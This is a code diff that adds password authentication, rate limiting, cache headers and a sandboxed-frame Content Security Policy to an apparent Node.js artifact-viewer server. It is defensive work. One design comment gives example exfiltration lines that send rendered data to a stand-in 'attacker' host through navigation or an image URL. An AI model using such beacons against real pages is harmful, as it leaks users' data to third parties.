@@ -1,7 +1,14 @@
 import { createServer, type IncomingMessage, type ServerResponse } from "node:http";
-import { existsSync, readFileSync, createReadStream } from "node:fs";
+import { existsSync, readFileSync, createReadStream, statSync } from "node:fs";
 import { stat } from "node:fs/promises";
-import { createHash, randomBytes } from "node:crypto";
+import { createHash, createHmac, randomBytes, scrypt, scryptSync, timingSafeEqual } from "node:crypto";
+import { promisify } from "node:util";
+import type { TLSSocket } from "node:tls";
+
+const scryptAsync = promisify(scrypt);
+// A password can be at most this many bytes before the KDF runs, so unauthenticated floods cannot
+// force scrypt work over arbitrarily large inputs.
+const MAX_PASSWORD_LENGTH = 256;
 import path from "node:path";
 import {
   createArtifact,
@@ -22,6 +29,37 @@ const outputDirectoryWithSeparator = `${outputDirectory}${path.sep}`;
 const UUID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
 const API_CATALOG_CONTENT_TYPE = 'application/linkset+json; profile="https://www.rfc-editor.org/info/rfc9727"';
 const API_CATALOG_LINK_HEADER = '</.well-known/api-catalog>; rel="api-catalog"; type="application/linkset+json"';
+// Present-but-empty is a configuration error, not "auth off". `AGENT_RENDER_PASSWORD=${SECRET}` in a
+// compose file where SECRET is missing expands to an empty string, and silently starting wide open
+// is the worst possible reading of an operator who explicitly set the variable. Unset stays unset.
+if (process.env.AGENT_RENDER_PASSWORD !== undefined && process.env.AGENT_RENDER_PASSWORD.length === 0) {
+  throw new Error("AGENT_RENDER_PASSWORD is set but empty. Unset it to run without auth, or give it a value.");
+}
+const authPassword = process.env.AGENT_RENDER_PASSWORD;
+const authCookieName = "agent_render_auth";
+const authSalt = randomBytes(32);
+
+// Reject an unusable password at startup rather than deriving a key no candidate can ever match:
+// isValidPassword bounds candidates at MAX_PASSWORD_LENGTH, so a longer configured secret would
+// start cleanly and then refuse every correct login. Same fail-fast posture as AGENT_RENDER_TTL_HOURS.
+if (authPassword !== undefined && authPassword.length > MAX_PASSWORD_LENGTH) {
+  throw new Error(`AGENT_RENDER_PASSWORD must be at most ${MAX_PASSWORD_LENGTH} characters.`);
+}
+
+// The shared password only ever flows through scrypt (a slow KDF), never a bare hash, so online
+// guessing on the write endpoint is rate-limited by the derivation cost. The salt is ephemeral
+// (process memory only), so cookies are invalidated on restart. authKey is null when no password is
+// configured (gate disabled).
+// scryptSync is acceptable here: it runs exactly once at startup, before the server accepts traffic.
+const authKey = authPassword === undefined ? null : scryptSync(authPassword, authSalt, 32);
+// Client-supplied X-Forwarded-Proto is only honored when the operator opts in (deployment sits
+// behind a trusted TLS-terminating proxy); otherwise a client could forge the scheme and force the
+// Secure cookie flag off on a real HTTPS deployment.
+const trustProxyHeaders = process.env.AGENT_RENDER_TRUST_PROXY === "1";
+// An independent random token, not a function of the password: the cookie is a bearer credential in
+// its own right, so deriving it from the secret would buy nothing and only widen the password's
+// exposure. Regenerated per process, which is what invalidates cookies across restarts.
+const authCookieToken = authKey === null ? "" : randomBytes(32).toString("base64url");
 
 const contentTypes = new Map<string, string>([
   [".html", "text/html; charset=utf-8"],
@@ -143,6 +181,43 @@ function hashesForFile(filePath: string): string[] {
  * payload cannot beacon out or load a tracking pixel. The tradeoff is that legitimately cross-origin
  * images in an artifact will not load on the self-hosted viewer. See docs/deployment.md.
  */
+/**
+ * CSP for the artifact isolation frame (public/artifact-frame.html).
+ *
+ * This document exists to run a trusted artifact's own markup and scripts, so unlike every other
+ * page it must allow inline script and style. The embedding iframe carries `sandbox="allow-scripts"`
+ * without `allow-same-origin`, so the document sits in an opaque origin with no access to the viewer
+ * DOM, the auth cookie, or the artifact API. Absent connect-src and form-action remove the obvious
+ * egress paths (fetch/XHR/beacon, form posts).
+ *
+ * This is NOT an egress guarantee, and must not be described as one. A script can navigate its own
+ * frame (`location = "https://attacker/?d=..."`), and no CSP directive blocks self-navigation --
+ * `navigate-to` was never shipped. Running untrusted scripts and preventing egress are mutually
+ * exclusive; this deployment mode chooses to run them. The protection this frame does provide is
+ * isolation from the viewer origin, which is what stops an artifact reading the operator's session.
+ *
+ * img-src stays same-origin for the same reason connect-src is absent: `default-src 'none'` does
+ * not cover images, so allowing remote hosts would let `<img src="https://attacker/?d=...">` (or a
+ * CSS `url()`) beacon the rendered content straight back out. This frame must be no more permissive
+ * than the viewer it isolates from, whose policy restricts images for exactly this reason.
+ */
+function artifactFrameContentSecurityPolicy(): string {
+  return [
+    "default-src 'none'",
+    "base-uri 'none'",
+    "form-action 'none'",
+    "frame-ancestors 'self'",
+    "style-src 'self' 'unsafe-inline'",
+    "img-src 'self' data: blob:",
+    "font-src 'self' data:",
+    "script-src 'unsafe-inline'",
+  ].join("; ");
+}
+
+function isArtifactFramePath(filePath: string): boolean {
+  return path.basename(filePath) === "artifact-frame.html";
+}
+
 function contentSecurityPolicy(hashes: string[], nonce?: string): string {
   const scriptSrc = [
     "'self'",
@@ -233,6 +308,11 @@ function jsonResponse(res: ServerResponse, status: number, body: unknown): void 
   res.writeHead(status, {
     "Content-Type": "application/json; charset=utf-8",
     "Content-Length": Buffer.byteLength(json),
+    // Artifact responses are per-credential. Without this a caching reverse proxy in front of the
+    // instance can store one authenticated response and replay it to a client that never passed the
+    // gate. Vary keeps any cache that ignores no-store keyed on the credential at least.
+    "Cache-Control": "no-store, private",
+    Vary: "Cookie, Authorization",
   });
   res.end(json);
 }
@@ -253,6 +333,9 @@ function htmlResponse(
     "Content-Type": "text/html; charset=utf-8",
     "Content-Length": Buffer.byteLength(body),
     "Content-Security-Policy": contentSecurityPolicy(hashes, nonce),
+    // Stored artifact pages and the sign-in page are per-credential; see jsonResponse.
+    "Cache-Control": "no-store, private",
+    Vary: "Cookie, Authorization",
   });
   res.end(body);
 }
@@ -297,7 +380,9 @@ async function serveStatic(res: ServerResponse, urlPath: string, method: string)
   // Exported HTML pages carry a strict CSP, using the hashes of the EXACT file served (each route
   // ships different inline scripts). No nonce: static pages inject no per-response script.
   if (path.extname(filePath) === ".html") {
-    headers["Content-Security-Policy"] = contentSecurityPolicy(hashesForFile(filePath));
+    headers["Content-Security-Policy"] = isArtifactFramePath(filePath)
+      ? artifactFrameContentSecurityPolicy()
+      : contentSecurityPolicy(hashesForFile(filePath));
   }
 
   res.writeHead(200, headers);
@@ -318,6 +403,207 @@ function parseArtifactId(pathname: string): string | null {
 /** Check if a path segment looks like a UUID v4. */
 function isUuid(value: string): boolean {
   return UUID_RE.test(value);
+}
+
+function constantTimeEqual(left: string, right: string): boolean {
+  const leftDigest = createHmac("sha256", authSalt).update(left).digest();
+  const rightDigest = createHmac("sha256", authSalt).update(right).digest();
+  return timingSafeEqual(leftDigest, rightDigest);
+}
+
+/**
+ * Failed credential attempts per client, so a flood cannot keep the KDF busy.
+ *
+ * The length bound below caps the cost of ONE attempt; without this, unlimited attempts still
+ * saturate the libuv threadpool (4 threads by default) and stall unrelated I/O — database reads,
+ * static files, /health — for everyone. Entries are pruned as they expire, so an attacker rotating
+ * source addresses grows this map only as fast as it drains.
+ */
+const failedAuthAttempts = new Map<string, { count: number; resetAt: number }>();
+const AUTH_ATTEMPT_WINDOW_MS = 60_000;
+const MAX_AUTH_ATTEMPTS_PER_WINDOW = 10;
+/**
+ * Derivations started but not yet finished, per client.
+ *
+ * Counting only *recorded failures* leaves the limit useless against a burst: every request in a
+ * concurrent flood passes the pre-check before any of them has failed and been recorded, so all of
+ * them queue scrypt work at once and saturate the libuv pool. In-flight work counts toward the
+ * budget from the moment it starts.
+ */
+const inFlightAuthDerivations = new Map<string, number>();
+/** Concurrent derivations one client may have running regardless of its failure count. */
+const MAX_CONCURRENT_AUTH_DERIVATIONS = 2;
+
+/**
+ * Identifies the client for rate-limiting purposes.
+ *
+ * Behind a reverse proxy — the documented primary deployment — every request arrives from the
+ * proxy's address, so keying on the socket alone would collapse all clients into one bucket and let
+ * a single attacker lock everyone else out with ten bad guesses a minute. When the operator has
+ * declared the proxy trusted, key on the RIGHTMOST X-Forwarded-For entry instead: that hop is the
+ * one the trusted proxy appended, whereas the leftmost is client-supplied and would let an attacker
+ * rotate keys to evade the limit entirely.
+ */
+function clientKey(req: IncomingMessage): string {
+  if (trustProxyHeaders) {
+    const forwardedFor = String(req.headers["x-forwarded-for"] ?? "");
+    const hops = forwardedFor.split(",").map((hop) => hop.trim()).filter((hop) => hop.length > 0);
+    const nearestHop = hops[hops.length - 1];
+    if (nearestHop !== undefined) return nearestHop;
+  }
+  return req.socket.remoteAddress ?? "unknown";
+}
+
+/** True when this client has spent its attempt budget and should be refused before any KDF work. */
+function isAuthRateLimited(req: IncomingMessage): boolean {
+  const key = clientKey(req);
+
+  if ((inFlightAuthDerivations.get(key) ?? 0) >= MAX_CONCURRENT_AUTH_DERIVATIONS) {
+    return true;
+  }
+
+  const entry = failedAuthAttempts.get(key);
+  if (entry === undefined) return false;
+  if (Date.now() >= entry.resetAt) {
+    failedAuthAttempts.delete(key);
+    return false;
+  }
+  return entry.count >= MAX_AUTH_ATTEMPTS_PER_WINDOW;
+}
+
+/** Runs `verify` while its cost counts against the client's concurrency budget. */
+async function withAuthDerivationSlot(req: IncomingMessage, verify: () => Promise<boolean>): Promise<boolean> {
+  const key = clientKey(req);
+  inFlightAuthDerivations.set(key, (inFlightAuthDerivations.get(key) ?? 0) + 1);
+  try {
+    return await verify();
+  } finally {
+    const remaining = (inFlightAuthDerivations.get(key) ?? 1) - 1;
+    if (remaining <= 0) inFlightAuthDerivations.delete(key);
+    else inFlightAuthDerivations.set(key, remaining);
+  }
+}
+
+function recordFailedAuth(req: IncomingMessage): void {
+  const key = clientKey(req);
+  const now = Date.now();
+  const entry = failedAuthAttempts.get(key);
+  if (entry === undefined || now >= entry.resetAt) {
+    failedAuthAttempts.set(key, { count: 1, resetAt: now + AUTH_ATTEMPT_WINDOW_MS });
+    return;
+  }
+  entry.count += 1;
+}
+
+/**
+ * Verifies a candidate password against the derived key in constant time via the same slow KDF.
+ * Async so the scrypt work runs on the libuv threadpool instead of blocking the event loop, and
+ * length-bounded so a single attempt cannot force KDF work over a huge input. Callers must gate on
+ * {@link isAuthRateLimited} first — that is what bounds the aggregate cost.
+ */
+async function isValidPassword(candidate: string): Promise<boolean> {
+  if (authKey === null) return true;
+  if (candidate.length === 0 || candidate.length > MAX_PASSWORD_LENGTH) return false;
+  const derived = (await scryptAsync(candidate, authSalt, 32)) as Buffer;
+  return timingSafeEqual(derived, authKey);
+}
+
+/** True when the request reached the server over TLS, directly or via a trusted terminating proxy. */
+function isSecureRequest(req: IncomingMessage): boolean {
+  if (trustProxyHeaders) {
+    const forwardedProto = String(req.headers["x-forwarded-proto"] ?? "").trim().toLowerCase();
+    // Only a single value is trusted. A trusted proxy overwrites this header (nginx
+    // `proxy_set_header X-Forwarded-Proto $scheme`); a comma-separated chain means some hop appended
+    // instead, so the leftmost value is client-supplied and could clear the Secure flag. Fall back
+    // to the real socket rather than believe a value an attacker may have prepended.
+    if (forwardedProto === "https") return true;
+    if (forwardedProto === "http") return false;
+  }
+  return (req.socket as TLSSocket).encrypted === true;
+}
+
+function cookieValue(req: IncomingMessage, name: string): string | null {
+  for (const part of (req.headers.cookie ?? "").split(";")) {
+    const separator = part.indexOf("=");
+    if (separator === -1) continue;
+    if (part.slice(0, separator).trim() === name) {
+      return part.slice(separator + 1).trim();
+    }
+  }
+  return null;
+}
+
+function hasValidCookie(req: IncomingMessage): boolean {
+  if (authKey === null) return true;
+  const supplied = cookieValue(req, authCookieName);
+  return supplied !== null && constantTimeEqual(supplied, authCookieToken);
+}
+
+async function hasValidApiAuth(req: IncomingMessage): Promise<boolean> {
+  if (authKey === null || hasValidCookie(req)) return true;
+  const authorization = req.headers.authorization;
+  if (!authorization?.startsWith("Bearer ")) return false;
+  return withAuthDerivationSlot(req, () => isValidPassword(authorization.slice("Bearer ".length)));
+}
+
+function safeRedirect(value: string | null): string {
+  if (!value || !value.startsWith("/") || value.startsWith("//") || value.startsWith("/\\")) {
+    return "/";
+  }
+  try {
+    const parsed = new URL(value, "http://localhost");
+    return `${parsed.pathname}${parsed.search}${parsed.hash}`;
+  } catch {
+    return "/";
+  }
+}
+
+function escapeHtml(value: string): string {
+  return value
+    .replace(/&/g, "&amp;")
+    .replace(/"/g, "&quot;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;");
+}
+
+function passwordPage(redirect: string, invalid = false): string {
+  return `<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Sign in — agent-render</title></head>
+<body><main><h1>Sign in to agent-render</h1>${invalid ? "<p>Incorrect password.</p>" : ""}
+<form method="post" action="/auth">
+<label>Password <input type="password" name="password" required autofocus></label>
+<input type="hidden" name="redirect" value="${escapeHtml(redirect)}">
+<button type="submit">Sign in</button>
+</form></main></body>
+</html>`;
+}
+
+function requireBrowserAuth(req: IncomingMessage, res: ServerResponse, redirect: string): boolean {
+  if (hasValidCookie(req)) return false;
+  htmlResponse(res, 401, passwordPage(redirect));
+  return true;
+}
+
+function staticHtmlPath(urlPath: string): string | null {
+  const normalizedPath = urlPath === "/" ? "/index.html" : urlPath;
+  let filePath = path.resolve(path.join(outputDirectory, normalizedPath));
+  if (!filePath.startsWith(outputDirectoryWithSeparator) && filePath !== outputDirectory) {
+    return null;
+  }
+
+  try {
+    if (statSync(filePath).isDirectory()) {
+      filePath = path.join(filePath, "index.html");
+    }
+  } catch {
+    if (!path.extname(filePath)) {
+      filePath = path.join(filePath, "index.html");
+    }
+  }
+
+  return existsSync(filePath) && path.extname(filePath) === ".html" ? filePath : null;
 }
 
 /**
@@ -381,13 +667,60 @@ async function handleRequest(req: IncomingMessage, res: ServerResponse): Promise
   if (pathname.startsWith("/api/")) {
     res.setHeader("Access-Control-Allow-Origin", "*");
     res.setHeader("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
-    res.setHeader("Access-Control-Allow-Headers", "Content-Type");
+    res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");
 
     if (method === "OPTIONS") {
       res.writeHead(204);
       res.end();
       return;
     }
+
+    // Reads are gated too: an open GET /api/artifacts/:id would let anyone with a link bypass the
+    // page cookie gate (and, with the wildcard CORS above, let any website read artifacts).
+    if (authKey !== null && !hasValidCookie(req) && isAuthRateLimited(req)) {
+      res.setHeader("Retry-After", String(AUTH_ATTEMPT_WINDOW_MS / 1000));
+      jsonResponse(res, 429, { error: "Too many failed authentication attempts." });
+      return;
+    }
+
+    if (!(await hasValidApiAuth(req))) {
+      recordFailedAuth(req);
+      res.setHeader("WWW-Authenticate", "Bearer");
+      jsonResponse(res, 401, { error: "Unauthorized." });
+      return;
+    }
+  }
+
+  if (pathname === "/auth" && method === "POST") {
+    let form: URLSearchParams;
+    try {
+      form = new URLSearchParams(await readBody(req));
+    } catch {
+      htmlResponse(res, 400, passwordPage("/"));
+      return;
+    }
+    const redirect = safeRedirect(form.get("redirect"));
+    const suppliedPassword = form.get("password") ?? "";
+    if (isAuthRateLimited(req)) {
+      res.setHeader("Retry-After", String(AUTH_ATTEMPT_WINDOW_MS / 1000));
+      htmlResponse(res, 429, passwordPage(redirect, true));
+      return;
+    }
+    if (await withAuthDerivationSlot(req, () => isValidPassword(suppliedPassword))) {
+      // Secure only when the request arrived over TLS: on a direct-HTTP deployment the browser would
+      // drop a Secure cookie and every gated page would loop back to the sign-in form.
+      const secureAttribute = isSecureRequest(req) ? " Secure;" : "";
+      res.setHeader(
+        "Set-Cookie",
+        `${authCookieName}=${authCookieToken}; HttpOnly;${secureAttribute} SameSite=Lax; Path=/; Max-Age=31536000`,
+      );
+      res.writeHead(303, { Location: redirect });
+      res.end();
+      return;
+    }
+    recordFailedAuth(req);
+    htmlResponse(res, 401, passwordPage(redirect, true));
+    return;
   }
 
   // POST /api/artifacts — create
@@ -465,6 +798,7 @@ async function handleRequest(req: IncomingMessage, res: ServerResponse): Promise
   // GET /:uuid — render viewer with stored payload
   const pathSegment = pathname.slice(1);
   if (method === "GET" && isUuid(pathSegment)) {
+    if (requireBrowserAuth(req, res, `${pathname}${url.search}`)) return;
     const row = getArtifact(pathSegment);
     if (!row) {
       htmlResponse(res, 404, errorPage("Artifact not found", "This artifact has expired or does not exist."));
@@ -481,6 +815,10 @@ async function handleRequest(req: IncomingMessage, res: ServerResponse): Promise
       htmlResponse(res, 500, errorPage("Server error", "Failed to render the artifact viewer."));
     }
     return;
+  }
+
+  if (method === "GET" && staticHtmlPath(pathname)) {
+    if (requireBrowserAuth(req, res, `${pathname}${url.search}`)) return;
   }
 
   // Static file fallback
